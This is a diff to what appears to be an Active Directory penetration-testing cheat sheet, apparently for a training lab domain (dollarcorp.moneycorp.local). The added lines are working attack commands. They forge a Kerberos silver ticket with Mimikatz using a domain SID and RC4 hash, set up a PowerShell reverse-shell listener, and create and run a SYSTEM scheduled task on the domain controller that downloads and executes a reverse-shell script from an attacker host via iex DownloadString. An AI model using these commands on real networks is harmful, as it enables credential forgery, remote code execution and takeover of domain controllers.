@@ -272,6 +272,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 ### Silver Ticket
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1e16be70054d1c5999aa53994e03e59c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+###with Mimikatz
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1e16be70054d1c5999aa53994e03e59c /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+###Host Powershell reverse shell on attacking host.
+Power -Reverse -IPAddress 172.16.100.X -Port 443
+###Create and run task
+schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcpEx.ps1''')'"
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "UserX"
 ```
 ### OverPass-the-Hash
 #### Rubeus
